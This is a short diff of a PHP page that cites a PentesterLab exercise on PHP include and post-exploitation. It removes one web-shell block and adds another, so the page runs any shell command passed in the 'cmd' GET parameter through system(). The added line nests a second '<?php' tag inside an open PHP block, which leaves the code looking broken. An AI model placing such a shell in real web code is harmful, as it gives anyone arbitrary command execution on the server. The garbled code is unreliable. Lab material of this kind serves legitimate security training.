@@ -2,9 +2,7 @@
 
 <!-- from https://pentesterlab.com/exercises/php_include_and_post_exploitation/course -->
 <?php
-<?php
-    system(trim($_GET['cmd']));
-?>
+hint("will exec the arg specified in the GET parameter \"cmd\"");
 ?>
 
 <form action="/CMD-1/index.php" method="GET">
@@ -12,5 +10,5 @@
 </form>
 
 <?php
-    system($_GET["cmd"]);
+<?php system(trim($_GET['cmd'])); ?>
  ?>
